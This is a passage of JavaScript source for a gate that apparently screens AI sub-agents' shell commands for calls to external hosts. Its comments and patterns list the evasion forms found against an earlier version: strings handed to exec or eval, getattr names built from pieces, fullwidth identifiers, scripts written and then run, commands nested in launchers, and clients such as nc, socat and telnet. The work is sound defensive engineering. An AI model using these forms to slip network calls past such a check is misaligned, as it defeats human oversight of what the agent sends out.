// requests.Session, httpx.Client, axios, got); a dict's `.get("key")` holds no scheme and is never judged.
const CALLEE = /(?:\burlopen|\bRequest|\bfetch|\bWebSocket|\bcreate_connection|\bHTTPS?Connection|\bconnect|\.(?:get|post|put|patch|delete|head|options|request|stream|ws_connect)|\baxios|\bgot)\s*\(\s*/g
// Callees whose first argument is a HOST without a scheme (http.client, socket.create_connection).
const HOST_CALLEE = /(?:create_connection|HTTPS?Connection)\s*\(\s*$/
const SCHEME = /^[a-z][a-z0-9+.-]*:\/\//i
// `NAME = "..."` / `const NAME = '...'` / `$name = "..."`: a name bound to a string literal in the body.
const BIND = /(?:^|[;\s{(,])(?:const\s+|let\s+|var\s+|my\s+|our\s+)?\$?([A-Za-z_][A-Za-z0-9_]*)\s*(?::\s*[A-Za-z_][\w.[\], ]*)?=(?![=>])\s*(?=(?:new\s+(?:URL|Request)\s*\(\s*)?[rRbBuUfF]{0,2}['"`])/gm
// The argument that starts at `pos` (masked and original align): a string literal, or a name.
function argAt(orig, masked, pos) {
  let k = pos
  const pre = /^(?:(?:url|uri|href)\s*=\s*)?(?:new\s+(?:URL|Request)\s*\(\s*)?(\(\s*)?/.exec(masked.slice(k, k + 40))
  k += pre[0].length
  const tuple = pre[1] !== undefined // connect((host, port)): the first element is a host
  const lit = /^([rRbBuUfF]{0,2})(['"`])/.exec(masked.slice(k, k + 3))
  if (lit) {
    const q = k + lit[1].length
    const quote = masked[q]
    const close = masked.startsWith(quote.repeat(3), q) ? quote.repeat(3) : quote
    const end = masked.indexOf(close, q + close.length)
    if (end === -1) return null
    return { value: orig.slice(q + close.length, end), next: end + close.length, tuple }
  }
  const id = /^([A-Za-z_][A-Za-z0-9_]*)\b/.exec(masked.slice(k, k + 80))
  return id ? { ident: id[1], next: k + id[1].length, tuple } : null
}
// Every EXTERNAL destination host of the network calls in a code body (unsorted, unique).
export function codeDestinations(body, lang, mask = null) {
  const orig = String(body ?? '')
  const masked = mask ?? maskCode(orig, lang)
  if (masked.length !== orig.length) return []
  const bound = new Map()
  for (const m of masked.matchAll(BIND)) {
    const a = argAt(orig, masked, m.index + m[0].length)
    if (a?.value !== undefined && SCHEME.test(a.value)) bound.set(m[1], a.value)
  }
  const hosts = new Set()
  for (const m of masked.matchAll(CALLEE)) {
    // JS `new Request(url)` builds a request OBJECT (route-handler tests pass one to a handler in-process); it goes out
    // only through a call, which reads the URL through it (fetch(new Request(url)), or a name bound to one).
    if (lang === 'js' && /^Request\b/.test(m[0]) && /\bnew\s+$/.test(masked.slice(Math.max(0, m.index - 12), m.index))) continue
    let a = argAt(orig, masked, m.index + m[0].length)
    // requests.request("GET", url) / urllib3 .request("GET", url): the destination is the 2nd argument.
    if (a?.value !== undefined && /request\s*\(\s*$/.test(m[0]) && /^[A-Z]+$/.test(a.value)) {
      const comma = /^\s*,\s*/.exec(masked.slice(a.next, a.next + 20))
      a = comma ? argAt(orig, masked, a.next + comma[0].length) : null
    }
    if (!a) continue
    let value = a.value ?? bound.get(a.ident)
    if (value === undefined) continue
    // f"{BASE}/x" / `${BASE}/x`: a leading bound name is its value.
    value = value.replace(/^\$?\{([A-Za-z_][A-Za-z0-9_]*)\}/, (all, n) => bound.get(n) ?? all)
    let host = null
    if (SCHEME.test(value)) host = destHost(value)
    else if (HOST_CALLEE.test(m[0]) || (/connect\s*\(\s*$/.test(m[0]) && a.tuple)) host = destHost(value.replace(/:\d+$/, ''))
    if (!host || /[{}$%]/.test(host) || isLocalHost(host)) continue
    hosts.add(host)
  }
  return [...hosts]
}
// --- (f) WHAT A PYTHON HEREDOC BODY RUNS BESIDES ITS OWN CALLS (95800e1d (3)) ---
// The destination reading (d) finds a network call in the CODE and reads where it goes. A Python heredoc body can run
// code the reading does not see as code: a string it hands to exec / eval / compile (or __import__ / import_module /
// getattr), a fullwidth name (Python reads identifiers as NFKC), an f-string's braces (they run), a file it writes and
// then runs, imports or loads, and a command line it starts (subprocess, os.system / popen / exec*, runpy). This section
// reads those as what they are: the string as Python code (judged by the same rules), the command line by classify
// itself, with the files this body writes visible to it. A string the scan cannot read to its end is not vouched for:
// a network primitive or client named anywhere AND an external URL anywhere denies (fail-closed, as the upstream does).
// Why not the upstream's "a body that CAN run a string is judged as text": measured on the fleet's Bash corpus
// (543 563 commands), that reading denied 11 sub-agent commands that pass today, each an external URL carried as DATA
// next to a subprocess, importlib or exec used for local work (a comment posted to the dashboard through a localhost
// curl, a hook test's fixture list, a docker exec). Not judged (allowed, as before): a dynamic name lookup that is never
// called (`m = __import__('x'); u = "https://..."`), a written file that is not code, a command line or path that is not
// a literal.
const PY_STRING_PREFIX = /^(?:[rR][bBfF]?|[bB][rR]?|[uU]|[fF][rR]?)$/
// The program with its string literals and comments blanked (length-preserving, newlines kept), or null when the scan
// cannot vouch for where a string ends. An f-string's TEXT is blanked like any literal, its {expressions} are code
// (they run), with their own strings blanked; `{{` / `}}` are text. An f-string whose braces do not balance is null.
export function pythonCodeOnly(text) {
  const out = []
  const n = text.length
  let i = 0
  while (i < n) {
    const c = text[i]
    if (c === '#') {
      let j = text.indexOf('\n', i)
      if (j === -1) j = n
      out.push(' '.repeat(j - i)); i = j; continue
    }
    if (c !== '"' && c !== "'") { out.push(c); i++; continue }
    let k = i
    while (k > 0 && /[A-Za-z0-9_]/.test(text[k - 1])) k--
    const word = text.slice(k, i)
    if (word !== '' && !PY_STRING_PREFIX.test(word)) return null // return"x", ab"x": not a plain literal
    const triple = text.startsWith(c.repeat(3), i)
    const delim = triple ? c.repeat(3) : c
    let j = i + delim.length
    let closed = false
    while (j < n) {
      if (text[j] === '\\') { j += 2; continue }
      if (text.startsWith(delim, j)) { closed = true; break }
      if (!triple && text[j] === '\n') return null // an unterminated one-line string
      j++
    }
    if (!closed) return null
    const body = text.slice(i + delim.length, j)
    if (/[fF]/.test(word)) {
      const masked = fstringMask(body)
      if (masked === null) return null
      out.push(delim + masked + delim)
    } else {
      out.push(delim + body.replace(/[^\n]/g, ' ') + delim)
    }
    i = j + delim.length
  }
  return out.join('')
}
// An f-string body with its text blanked and its {expressions} kept (their own string contents blanked), or null when
// the braces do not balance or an expression's string does not end inside it.
function fstringMask(body) {
  let out = ''
  let i = 0
  while (i < body.length) {
    const c = body[i]
    if ((c === '{' || c === '}') && body[i + 1] === c) { out += '  '; i += 2; continue }
    if (c === '}') return null
    if (c !== '{') { out += c === '\n' ? '\n' : ' '; i++; continue }
    let depth = 0
    let j = i
    for (; j < body.length; j++) {
      const d = body[j]
      if (d === "'" || d === '"') {
        const e = body.indexOf(d, j + 1)
        if (e === -1) return null
        out += d + body.slice(j + 1, e).replace(/[^\n]/g, ' ') + d
        j = e
        continue
      }
      if (d === '{' || d === '(' || d === '[') depth++
      else if (d === '}' || d === ')' || d === ']') depth--
      out += d
      if (depth === 0) break
    }
    if (depth !== 0) return null
    i = j + 1
  }
  return out
}
// The common escapes of a non-raw literal, enough to read the code a string holds.
function pyUnescape(s) {
  return s.replace(/\\(['"\\ntr])/g, (all, c) => ({ n: '\n', t: '\t', r: '\r' })[c] ?? c)
}
// The plain string literal (no f-string) that starts at `pos` (after blanks) of the code mask: { value, end }, or null.
function pyLiteralAt(text, mask, pos) {
  const m = /^[ \t]*([rRbBuU]{0,2})(['"])/.exec(mask.slice(pos, pos + 12))
  if (!m) return null
  const q = pos + m[0].length - 1
  const close = mask.startsWith(m[2].repeat(3), q) ? m[2].repeat(3) : m[2]
  const end = mask.indexOf(close, q + close.length)
  if (end === -1) return null
  const raw = text.slice(q + close.length, end)
  return { value: /[rR]/.test(m[1]) ? raw : pyUnescape(raw), end: end + close.length }
}
// The index of the bracket that closes the one at `open` in the code mask (strings are blank there), or -1.
function pyClose(mask, open) {
  let depth = 0
  for (let j = open; j < mask.length; j++) {
    const d = mask[j]
    if (d === '(' || d === '[' || d === '{') depth++
    else if (d === ')' || d === ']' || d === '}') { depth--; if (depth === 0) return j }
  }
  return -1
}
// The literal arguments of the call whose `(` is at `open`: an array with one entry per top-level argument, a plain
// string value or a list of them, or null for any other argument.
function pyArgs(text, mask, open) {
  const close = pyClose(mask, open)
  if (close === -1) return []
  const out = []
  let k = open + 1
  while (k < close) {
    let e = k
    let depth = 0
    for (; e < close; e++) {
      const d = mask[e]
      if (d === '(' || d === '[' || d === '{') depth++
      else if (d === ')' || d === ']' || d === '}') depth--
      else if (d === ',' && depth === 0) break
    }
    const seg = mask.slice(k, e)
    const lit = pyLiteralAt(text, mask, k)
    if (lit && /^\s*$/.test(mask.slice(lit.end, e))) out.push(lit.value)
    else if (/^\s*\[/.test(seg)) {
      const lb = k + seg.indexOf('[')
      const rb = pyClose(mask, lb)
      const items = rb === -1 ? null : pyArgs(text, mask.slice(0, lb) + '(' + mask.slice(lb + 1, rb) + ')' + mask.slice(rb + 1), lb)
      out.push(items && items.length && items.every((x) => typeof x === 'string') ? items : null)
    } else out.push(/^\s*[A-Za-z_]\w*\s*=/.test(seg) ? { kw: seg.trim() } : null)
    k = e + 1
  }
  return out
}
const shQuote = (w) => (/^[\w@%+=:,./-]+$/.test(w) ? w : `'${w.replace(/'/g, `'\\''`)}'`)
const NET_WORDS_PY = (text) => NET_PRIMITIVE.test(text.replace(/\burllib\.parse\b/g, 'URLPARSE')) || NET_CLIENT_WORD.test(text)
// What a Python heredoc body runs besides its own calls: { hosts } the external destinations found in code the reading
// (d) does not see as code, { runs } the command lines it starts (for classify), { written } [path, content] of the
// files it writes. `depth` bounds the strings-in-strings recursion.
export function pythonBodyPlan(body, depth = 0) {
  const text = String(body ?? '').normalize('NFKC')
  const plan = { hosts: [], runs: [], written: [] }
  const mask = pythonCodeOnly(text)
  if (mask === null || mask.length !== text.length) {
    if (NET_WORDS_PY(text)) plan.hosts = [...new Set([...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf))]
    return plan
  }
  const hosts = new Set(codeDestinations(text, 'py', mask))
  // names bound to a plain string literal (the last binding wins)
  const bound = new Map()
  for (const m of mask.matchAll(/(?:^|[\n;])[ \t]*([A-Za-z_]\w*)[ \t]*=(?!=)/g)) {
    const lit = pyLiteralAt(text, mask, m.index + m[0].length)
    if (lit) bound.set(m[1], lit.value)
  }
  const firstArg = (open) => {
    const args = pyArgs(text, mask, open)
    if (typeof args[0] === 'string') return args[0]
    const id = /^\s*([A-Za-z_]\w*)\s*[,)]/.exec(mask.slice(open + 1, open + 80))
    return id ? (bound.get(id[1]) ?? null) : null
  }
  // the files this body writes: open(P, 'w'...).write(S), `with open(P, 'w') as F:` ... F.write(S), Path(P).write_text(S)
  const files = new Map()
  const addWrite = (p, s) => { if (typeof p === 'string' && typeof s === 'string') files.set(p, (files.get(p) ?? '') + s) }
  for (const m of mask.matchAll(/(?<![\w.])open\s*\(/g)) {
    const open = m.index + m[0].length - 1
    const args = pyArgs(text, mask, open)
    if (typeof args[0] !== 'string' || !/[wax]/.test(typeof args[1] === 'string' ? args[1] : '')) continue
    const close = pyClose(mask, open)
    const chained = /^\s*\.\s*write\s*\(/.exec(mask.slice(close + 1, close + 40))
    if (chained) addWrite(args[0], firstArg(close + chained[0].length))
    const asName = /^\s*as\s+([A-Za-z_]\w*)\s*:/.exec(mask.slice(close + 1, close + 60))
    if (asName) for (const w of mask.matchAll(new RegExp(`\\b${asName[1]}\\s*\\.\\s*write\\s*\\(`, 'g'))) addWrite(args[0], firstArg(w.index + w[0].length - 1))
  }
  for (const m of mask.matchAll(/\bPath\s*\(/g)) {
    const open = m.index + m[0].length - 1
    const p = firstArg(open)
    const close = pyClose(mask, open)
    const wt = /^\s*\.\s*write_text\s*\(/.exec(mask.slice(close + 1, close + 40))
    if (p && wt) addWrite(p, firstArg(close + wt[0].length))
  }
  plan.written = [...files]
  const writtenModule = (name) => [...files.keys()].find((p) => p.split('/').pop() === `${name}.py`)
  // strings handed to the code runners: judged as Python, by these same rules
  if (depth < 3) {
    for (const m of mask.matchAll(/(?<![\w.])(?:exec|eval|compile|__import__|getattr)\s*\(|\bimport_module\s*\(/g)) {
      const src = firstArg(m.index + m[0].length - 1)
      if (src === null) continue
      const inner = pythonBodyPlan(src, depth + 1)
      for (const h of inner.hosts) hosts.add(h)
      plan.runs.push(...inner.runs)
      plan.written.push(...inner.written)
    }
  }
  // f8e45d25: a dynamic attribute lookup that resolves a network primitive by NAME and calls the result. The destination
  // reading (codeDestinations) looks for a known callee word, but here that word is a STRING the code mask has blanked, and
  // the call is on the getattr result, not on a named callee: `getattr(m, 'urlopen')(url)`, the name built from pieces
  // (`getattr(m, 'url' + 'open')(url)`), or the result bound first (`f = getattr(m, 'urlopen'); f(url)`). Read each as the
  // static call `x.<name>(<the call's own args>)` and hand that to codeDestinations, so the URL in the call is found. The
  // name is resolved from string literals (one, or a `+`-concatenation of them) and from names bound to a string literal
  // above; a name that is not a network primitive makes codeDestinations find nothing, so this stays precise.
  const litName = (seg) => {
    // the string value of a segment that is one literal or a `+`-concatenation of literals (else null)
    let out = ''
    const re = /([rRbBuU]{0,2})(['"])/g
    let last = 0
    let mm
    while ((mm = re.exec(seg))) {
      // between pieces only blanks, `+` (concatenation) and an opening `(`; nothing else
      if (!/^[\s+(]*$/.test(seg.slice(last, mm.index))) return null
      const q = mm.index + mm[1].length
      const quote = seg[q]
      const close = seg.startsWith(quote.repeat(3), q) ? quote.repeat(3) : quote
      const end = seg.indexOf(close, q + close.length)
      if (end === -1) return null
      out += /[rR]/.test(mm[1]) ? seg.slice(q + close.length, end) : pyUnescape(seg.slice(q + close.length, end))
      last = end + close.length
      re.lastIndex = last
    }
    return out && /^[\s)]*$/.test(seg.slice(last)) ? out : null
  }
  // the second argument of a getattr(...) call: its resolved name, or null. `goOpen` is the `(` of getattr.
  const getattrName = (goOpen) => {
    const goClose = pyClose(mask, goOpen)
    if (goClose === -1) return null
    const comma = mask.slice(goOpen + 1, goClose).indexOf(',')
    if (comma === -1) return null
    const from = goOpen + 1 + comma + 1
    const seg = text.slice(from, goClose)
    const mseg = mask.slice(from, goClose)
    const direct = litName(seg)
    if (direct !== null) return direct
    const id = /^\s*([A-Za-z_]\w*)\s*$/.exec(mseg)
    return id ? (bound.get(id[1]) ?? null) : null
  }
  const dynCall = (name, callOpen) => {
    const callClose = pyClose(mask, callOpen)
    if (callClose === -1) return
    const snippet = `x.${name}${text.slice(callOpen, callClose + 1)}`
    for (const h of codeDestinations(snippet, 'py')) hosts.add(h)
  }
  // a name bound to a getattr(...) result, called later: `f = getattr(m, 'urlopen')`
  const dynBound = new Map()
  for (const m of mask.matchAll(/(?:^|[\n;])[ \t]*([A-Za-z_]\w*)[ \t]*=(?!=)[ \t]*getattr\s*\(/g)) {
    const name = getattrName(m.index + m[0].length - 1)
    if (name) dynBound.set(m[1], name)
  }
  for (const m of mask.matchAll(/\bgetattr\s*\(/g)) {
    const goOpen = m.index + m[0].length - 1
    const goClose = pyClose(mask, goOpen)
    if (goClose === -1) continue
    const after = /^\s*\(/.exec(mask.slice(goClose + 1, goClose + 20))
    if (!after) continue // the getattr result is not called here
    const name = getattrName(goOpen)
    if (name) dynCall(name, goClose + 1 + after[0].length - 1)
  }
  for (const [f, name] of dynBound) {
    for (const m of mask.matchAll(new RegExp(`(?<![\\w.])${f}\\s*\\(`, 'g'))) dynCall(name, m.index + m[0].length - 1)
  }
  // the command lines it starts
  const procAlias = new Set(['subprocess'])
  for (const m of mask.matchAll(/\bimport\s+[^\n;]*?\bsubprocess\s+as\s+([A-Za-z_]\w*)/g)) procAlias.add(m[1])
  const fromProc = /\bfrom\s+subprocess\s+import\b/.test(mask)
  const procRe = new RegExp(`(?:\\b(?:${[...procAlias].join('|')})\\s*\\.\\s*${fromProc ? '|(?<![\\w.])' : ''})(run|call|check_call|check_output|Popen|getoutput|getstatusoutput)\\s*\\(`, 'g')
  const asLine = (a) => (typeof a === 'string' ? a : Array.isArray(a) ? a.map(shQuote).join(' ') : null)
  for (const m of mask.matchAll(procRe)) {
    const line = asLine(pyArgs(text, mask, m.index + m[0].length - 1)[0])
    if (line) plan.runs.push(line)
  }
  for (const m of mask.matchAll(/\bos\s*\.\s*(system|popen)\s*\(/g)) {
    const line = firstArg(m.index + m[0].length - 1)
    if (line) plan.runs.push(line)
  }
  for (const m of mask.matchAll(/\bos\s*\.\s*(exec[lv]p?e?|spawn[lv]p?e?)\s*\(/g)) {
    const args = pyArgs(text, mask, m.index + m[0].length - 1)
    const a = m[1].startsWith('spawn') ? args.slice(1) : args // spawn*(mode, path, ...)
    const path = typeof a[0] === 'string' ? a[0] : null
    const rest = Array.isArray(a[1]) ? a[1].slice(1) : a.slice(2).filter((x) => typeof x === 'string')
    if (path) plan.runs.push([path, ...rest].map(shQuote).join(' '))
  }
  for (const m of mask.matchAll(/\b(?:run_path|spec_from_file_location|SourceFileLoader)\s*\(/g)) {
    const args = pyArgs(text, mask, m.index + m[0].length - 1)
    const p = m[0].startsWith('run_path') ? args[0] : args[1]
    if (typeof p === 'string') plan.runs.push(`python3 ${shQuote(p)}`)
  }
  // a module this body wrote, imported
  for (const m of mask.matchAll(/(?:^|[\n;:])[ \t]*(?:import\s+([\w., \t]+)|from\s+([\w.]+)\s+import\b)/g)) {
    for (const name of (m[1] ?? m[2]).split(',').map((x) => x.trim().split(/\s+/)[0].split('.')[0]).filter(Boolean)) {
      const p = writtenModule(name)
      if (p) plan.runs.push(`python3 ${shQuote(p)}`)
    }
  }
  for (const m of mask.matchAll(/\bimport_module\s*\(/g)) {
    const name = firstArg(m.index + m[0].length - 1)
    const p = name ? writtenModule(name.split('.')[0]) : null
    if (p) plan.runs.push(`python3 ${shQuote(p)}`)
  }
  plan.hosts = [...hosts]
  return plan
}
// Heredoc bodies of the ORIGINAL text, with the offset of their opener. The opener is found in the
// MASKED text (a `<<` inside quotes is not one; `<<<` is a here-string, not a heredoc).
function heredocBodies(orig, masked) {
  const out = []
  const re = /<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/g
  let m
  while ((m = re.exec(masked))) {
    if (masked[m.index - 1] === '<') continue
    const tag = m[1] ?? m[2] ?? m[3]
    const nl = orig.indexOf('\n', m.index + m[0].length)
    if (nl === -1) continue
    const rel = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm').exec(orig.slice(nl + 1))
    if (rel) out.push({ at: m.index, body: orig.slice(nl + 1, nl + 1 + rel.index), start: nl + 1, end: nl + 1 + rel.index + rel[0].length, quoted: m[3] === undefined })
  }
  return out
}
// 95800e1d (4), K1/K5: a here-string is a stdin feed too (`python3 <<< "..."`, `bash <<< '...'`, `done <<< "$U"`). Each
// live `<<<` becomes a body entry of the same shape as a heredoc's: { at, body, start, end, quoted }, where body is the word's
// shell value, [start, end) covers the operator and the word (so the word is no argument of the command), and quoted is a
// single-quoted word (the shell does not expand it; a double-quoted or bare one is expanded, as a heredoc with a bare tag).
// The word ends at unquoted whitespace or a shell operator (the upstream's hereStringWord).
function hereStringWord(text, i) {
  while (i < text.length && (text[i] === ' ' || text[i] === '\t')) i++
  const s = i
  while (i < text.length && !/[\s;&|<>()]/.test(text[i])) {
    if (text[i] === "'") { const e = text.indexOf("'", i + 1); i = e === -1 ? text.length : e + 1; continue }
    if (text[i] === '"' || (text[i] === '$' && text[i + 1] === "'")) {
      const q = text[i] === '"' ? '"' : "'"; let j = text[i] === '"' ? i + 1 : i + 2
      while (j < text.length && text[j] !== q) j += text[j] === '\\' ? 2 : 1
      i = j + 1; continue
    }
    i += text[i] === '\\' ? 2 : 1
  }
  return { start: s, end: Math.min(i, text.length) }
}
function hereStringBodies(orig, herestrings) {
  const out = []
  for (const at of herestrings ?? []) {
    const { start, end } = hereStringWord(orig, at + 3)
    if (end <= start) continue
    const raw = orig.slice(start, end)
    out.push({ at, body: shellWords(raw).join(' '), start: at, end, quoted: raw.startsWith("'"), herestring: true })
  }
  return out
}
// `read` options that take a value; -a's value is itself a variable name (an array).
const READ_OPT_WITH_VALUE = new Set('adnNptui'.split(''))
// The command word of the span that holds offset `at` (basename; assignments and PREFIX_WORDS skipped), or null.
function commandWordAt(masked, at) {
  for (const [a, b] of spans(masked)) {
    if (at < a || at > b) continue
    const mw = words(masked.slice(a, b))
    let i = 0
    while (i < mw.length && (ASSIGN.test(mw[i]) || PREFIX_WORDS.has(mw[i]))) i++
    return i < mw.length ? mw[i].split('/').pop() : null
  }
  return null
}
// Every `read` in the command, as { names, array } (the upstream's collectReads): `while IFS= read -r a b` -> names
// [a, b]; `read -a arr` -> array arr; a bare `read` -> names [REPLY].
function collectReads(orig, masked) {
  const reads = []
  for (const [a, b] of spans(masked)) {
    const sw = shellWords(orig.slice(a, b))
    let k = 0
    const skip = () => { while (k < sw.length && (ASSIGN.test(sw[k]) || PREFIX_WORDS.has(sw[k]))) k++ }
    skip()
    if (sw[k] === 'while' || sw[k] === 'until') { k++; skip() }
    if (sw[k] !== 'read') continue
    const names = []; let array = null
    for (k++; k < sw.length; k++) {
      const w = sw[k]
      if (w.startsWith('-') && w.length > 1) {
        for (let q = 1; q < w.length; q++) {
          if (!READ_OPT_WITH_VALUE.has(w[q])) continue
          const v = q + 1 < w.length ? w.slice(q + 1) : sw[++k]
          if (w[q] === 'a' && /^[A-Za-z_]\w*$/.test(v ?? '')) array = v
          break
        }
        continue
      }
      if (/^[A-Za-z_]\w*$/.test(w)) names.push(w); else break
    }
    reads.push({ names: names.length || array ? names : ['REPLY'], array })
  }
  return reads
}
// The values one `read` gives its variables from a fed text, line by line, the way read splits a line: field k to the
// k-th name, the rest of the line to the last name, every field to an array.
function readValues(text, { names, array }) {
  const out = {}
  const add = (v, x) => { if (x) (out[v] ??= []).push(x) }
  for (const line of text.split('\n')) {
    const f = line.trim().split(/\s+/).filter(Boolean)
    names.forEach((v, k) => add(v, k < names.length - 1 ? f[k] : f.slice(k).join(' ')))
    if (array) for (const x of f) add(array, x)
  }
  return out
}
function readBody(path) {
  try {
    if (!existsSync(path)) return null
    const st = statSync(path)
    if (!st.isFile() || st.size > MAX_BODY_BYTES) return null
    return readFileSync(path, 'utf-8')
  } catch { return null }
}
// What an interpreter runs, from the words after it: { file } a script path (a stdin redirect from a file
// counts), { stdin: true } the code comes from stdin (`-`, or no script word), null not judged (a one-liner,
// a module run, a test runner).
function scriptOf(args, interp) {
  const lang = langOf(interp)
  const codeFlags = BODY_CODE_FLAGS[lang] ?? []
  const valueFlags = BODY_VALUE_FLAGS[lang] ?? []
  let stdinFile = null
  for (let k = 0; k < args.length; k++) {
    const w = args[k]
    if (w === '<') { stdinFile = args[k + 1] ?? null; k++; continue }
    if (/^<[^<&]/.test(w)) { stdinFile = w.slice(1); continue }
    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue }
    if (w === '-') return stdinFile ? { file: stdinFile } : { stdin: true }
    if (codeFlags.includes(w) || (lang === 'py' && w === '-m') || /^--test(?:$|[-=])/.test(w)) return null
    if ((BODY_NO_EXEC[lang] ?? []).includes(w) || (lang === 'sh' && /^-[A-Za-z]*n[A-Za-z]*$/.test(w))) return null
    if (w.startsWith('-') || (lang === 'sh' && w.startsWith('+'))) { if (valueFlags.includes(w)) k++; continue }
    if ((interp === 'deno' || interp === 'bun') && w === 'run') continue
    return { file: w }
  }
  return stdinFile ? { file: stdinFile } : { stdin: true }
}
// The written file of `cat > PATH <<TAG` / `cat <<TAG > PATH` / `tee PATH <<TAG` (an append is not tracked).
function writtenPath(argv) {
  const w0 = (argv[0] ?? '').split('/').pop()
  if (w0 === 'tee' && argv.some((w) => w === '-a' || w === '--append')) return null
  for (let k = 1; k < argv.length; k++) {
    const w = argv[k]
    if (w === '>' || w === '>|') return argv[k + 1] ?? null
    if (/^>[^>&|]/.test(w)) return w.slice(1)
    if (w0 === 'tee' && !w.startsWith('-') && !w.startsWith('<')) return w
  }
  return null
}

// --- (e) LAUNCHERS, COMMAND STRINGS, SOURCED FILES, PIPED PROGRAMS, NAMED CLIENTS (c83a6bf6) ---
// The real command word of a sub-command was looked for after a fixed set of prefix words. So a launcher that runs the
// rest of its arguments as a command hid that command when it carried an option with a value, or when the set did not
// name it; a command handed over as a STRING (to a shell, to eval, to a launcher's command option) was never looked at;
// neither was a file read with `source`, a program piped into an interpreter, a project runner, the destination of a
// network client other than curl, a URL passed to judged code through the environment, or a local module that judged
// code imports. The tester measured the forms (card c83a6bf6); they are form classes here, the concrete commands stay
// out of the repository on purpose.
// What the gate does now:
//   - a launcher is skipped with its options (one that takes a value takes the next word, or carries it attached),
//     its operands (a duration, a lock file, a priority) and `--`; launchers chain;
//   - a command string (a shell's -c, eval, a launcher's command option, a launcher that joins its words) is
//     classified as a command of its own, to the depth limit of a substitution;
//   - `source FILE` and `. FILE` judge the file as a shell body;
//   - a program piped into an interpreter that reads it from stdin is the upstream heredoc, file or printed text;
//     when the upstream is none of these, the call is denied: it cannot be judged;
//   - a project runner (uv/poetry/pipenv/pdm/hatch/rye run) is skipped to the interpreter or script it runs;
//   - wget, nc, ncat, netcat, telnet, socat, aria2c and the httpie clients have their destinations read from the argv
//     (the permission deny list names some of them, but it does not look inside a command string);
//   - an external URL assigned in the same command to a name the judged code reads is that code's destination;
//   - a local module the judged code imports (python import, a relative JS import/require) is judged too, to a small
//     depth.
// And what is NOT a command is not read as one (a week of the fleet's real commands, judged by the old and the new gate,
// showed each of these as a false deny): a heredoc body (the stdin of the command that opened it), a case statement's
// header and pattern lists, a client name a shell function shadows, a NAME=v that is an argument or a heredoc line (the
// environment is the command's own assignments). A substitution sees the variables of the text around it.
const ASSIGN = /^[A-Za-z_][A-Za-z0-9_]*=/
const LEAD_WORDS = new Set(['do', 'then', 'else', 'elif', '{', '(', '!'])
// value: options whose value is the NEXT word (an attached value, -oL / -n5 / --opt=v, is one word anyway);
// operands: plain words before the command (a duration, a lock file, a priority or CPU mask); string: options whose
// value is a whole command line; join: the remaining words are one command line; none: no command of its own unless
// a string option gives one (the rest of its words are not a command).
export const LAUNCHERS = {
  env: { value: ['-u', '--unset', '-C', '--chdir'], string: ['-S', '--split-string'] },
  sudo: { value: ['-u', '--user', '-g', '--group', '-h', '--host', '-p', '--prompt', '-C', '--close-from', '-D', '--chdir', '-r', '--role', '-t', '--type', '-T', '--command-timeout', '-U', '--other-user'] },
  doas: { value: ['-u', '-C'] },
  nice: { value: ['-n', '--adjustment'] },
  ionice: { value: ['-c', '--class', '-n', '--classdata'] },
  chrt: { value: [], operands: 1 },
  taskset: { value: [], operands: 1 },
  timeout: { value: ['-k', '--kill-after', '-s', '--signal'], operands: 1 },
  stdbuf: { value: ['-i', '--input', '-o', '--output', '-e', '--error'] },
  setsid: { value: [] },
  nohup: { value: [] },
  time: { value: ['-f', '--format', '-o', '--output'] },
  command: { value: [] },
  builtin: { value: [] },
  exec: { value: ['-a'] },
  xargs: { value: ['-a', '--arg-file', '-d', '--delimiter', '-E', '-I', '-L', '-n', '--max-args', '-P', '--max-procs', '-s', '--max-chars', '--process-slot-var'] },
  flock: { value: ['-w', '--timeout', '-E', '--conflict-exit-code'], operands: 1, string: ['-c', '--command'] },
  strace: { value: ['-e', '-o', '-p', '-s', '-u', '-a', '-b', '-I', '-O', '-S', '-X', '-P', '-E'] },
  ltrace: { value: ['-e', '-o', '-p', '-s', '-u', '-a', '-n', '-l', '-w', '-x', '-L'] },
  runuser: { value: ['-u', '--user', '-g', '--group', '-G', '--supp-group', '-s', '--shell', '-w', '--whitelist-environment'], string: ['-c', '--command'] },
  su: { value: ['-g', '--group', '-G', '--supp-group', '-s', '--shell', '-w', '--whitelist-environment'], string: ['-c', '--command'], none: true },
  watch: { value: ['-n', '--interval', '-q', '--equexit'], join: true },
  unbuffer: { value: [] },
  script: { value: ['-E', '--echo', '-o', '--output-limit', '-T', '--log-timing', '-B', '--log-io', '-I', '--log-in', '-O', '--log-out', '-m', '--logging-format'], string: ['-c', '--command'], none: true },
}
// The real command of a sub-command's words: { at, str, viaXargs } -- `at` is the index of the command word (w.length
// when there is none), `str` a command line a launcher runs as a string (classified on its own), else null.
export function unwrapLaunchers(w) {
  let i = 0; let viaXargs = false
  for (;;) {
    while (i < w.length && (ASSIGN.test(w[i]) || LEAD_WORDS.has(w[i]))) i++
    const name = (w[i] ?? '').split('/').pop()
    const spec = Object.hasOwn(LAUNCHERS, name) ? LAUNCHERS[name] : null
    if (!spec) return { at: i, str: null, viaXargs }
    if (name === 'xargs') viaXargs = true
    i++
    let operands = spec.operands ?? 0
    for (; i < w.length; i++) {
      const t = w[i]
      if (t === '--' && !spec.none) { i++; break }
      const sv = (spec.string ?? []).find((f) => t === f || t.startsWith(f + '='))
      if (sv !== undefined) return { at: w.length, str: t === sv ? (w[i + 1] ?? '') : t.slice(sv.length + 1), viaXargs }
      if (t.startsWith('-') && t.length > 1) { if (spec.value.includes(t)) i++; continue }
      if (spec.none) continue
      if (name === 'env' && ASSIGN.test(t)) continue
      if (operands > 0) { operands--; continue }
      break
    }
    if (spec.join) return { at: w.length, str: w.slice(i).join(' ') || null, viaXargs }
    if (spec.none) return { at: w.length, str: null, viaXargs }
  }
}
// A shell's command-string option: -c, or a cluster of short flags that carries c (-lc, -ec).
const SHELL_STRING_FLAG = /^-[A-Za-z]*c[A-Za-z]*$/
const RUNNERS = new Set(['uv', 'poetry', 'pipenv', 'pdm', 'hatch', 'rye'])
const RUNNER_VALUE = new Set(['--with', '--with-requirements', '--python', '-p', '--project', '--directory', '--env-file', '--extra', '--group', '--index', '--default-index', '--index-url', '--extra-index-url', '-e', '--env', '-f', '--find-links', '--package'])
// `<runner> run [options] X ...`: the interpreter X, or the python script X; null when this is not a runner.
function unwrapRunner(word, rest) {
